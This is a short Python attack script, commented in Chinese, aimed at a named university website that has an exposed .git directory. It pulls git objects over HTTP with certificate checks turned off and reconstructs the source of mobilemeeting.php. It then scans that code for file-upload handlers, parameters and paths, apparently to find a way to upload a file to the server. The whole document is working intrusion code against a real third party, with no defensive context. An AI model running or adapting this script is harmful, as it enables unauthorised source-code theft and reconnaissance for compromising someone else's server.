#!/usr/bin/env python3
import requests
import urllib3
import zlib
import struct
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://olympic.su.ac.th/.git"

print("[*] 下载mobilemeeting.php源码...")

# 获取tree对象
tree_hash = "206be85b2f5820dcbb812b49c73c77c48027d4d3"
tree_path = f"{base_url}/objects/{tree_hash[:2]}/{tree_hash[2:]}"
tree_resp = requests.get(tree_path, verify=False, timeout=5)

if tree_resp.status_code == 200:
    tree_data = zlib.decompress(tree_resp.content)
    print(f"[+] Tree对象获取成功: {len(tree_data)} bytes")
    
    # 解析tree对象
    # tree格式: mode filename\0hash
    pos = 0
    while pos < len(tree_data):
        # 查找null分隔符
        null_pos = tree_data.find(b'\x00', pos)
        if null_pos == -1:
            break
        
        entry = tree_data[pos:null_pos]
        # 解析mode和filename
        parts = entry.split(b' ', 1)
        if len(parts) == 2:
            mode = parts[0].decode()
            filename = parts[1].decode()
            
            # 获取hash（20字节）
            hash_start = null_pos + 1
            if hash_start + 20 <= len(tree_data):
                file_hash = tree_data[hash_start:hash_start+20].hex()
                
                if 'mobilemeeting.php' in filename:
                    print(f"[+] 找到mobilemeeting.php: {file_hash}")
                    
                    # 下载blob对象
                    blob_path = f"{base_url}/objects/{file_hash[:2]}/{file_hash[2:]}"
                    blob_resp = requests.get(blob_path, verify=False, timeout=5)
                    
                    if blob_resp.status_code == 200:
                        blob_data = zlib.decompress(blob_resp.content)
                        # 跳过header
                        content = blob_data.split(b'\x00', 1)[1] if b'\x00' in blob_data else blob_data[50:]
                        
                        # 保存源码
                        with open('/tmp/mobilemeeting.php', 'wb') as f:
                            f.write(content)
                        
                        print(f"[+] mobilemeeting.php源码已下载: {len(content)} bytes")
                        
                        # 分析上传功能
                        content_str = content.decode('utf-8', errors='ignore')
                        if '$_FILES' in content_str or 'move_uploaded_file' in content_str:
                            print("[+] 发现文件上传功能!")
                            
                            # 提取上传相关代码
                            upload_matches = re.findall(r'[\$_FILES\[[^\]]+\].*?move_uploaded_file[^;]+;', content_str, re.DOTALL)
                            for match in upload_matches[:5]:
                                print(f"[*] 上传代码: {match[:200]}")
                        
                        # 查找上传参数
                        files_params = re.findall(r'\$_FILES\[["\']([^"\']+)["\']\]', content_str)
                        print(f"[+] 发现的FILES参数: {files_params}")
                        
                        # 查找上传路径
                        upload_paths = re.findall(r'["\']([^"\']*uploads?[^"\']*)["\']', content_str)
                        print(f"[+] 发现的上传路径: {upload_paths}")
                        
                        break
        
        pos = null_pos + 21  # null + 20字节hash

print("[+] 源码分析完成")
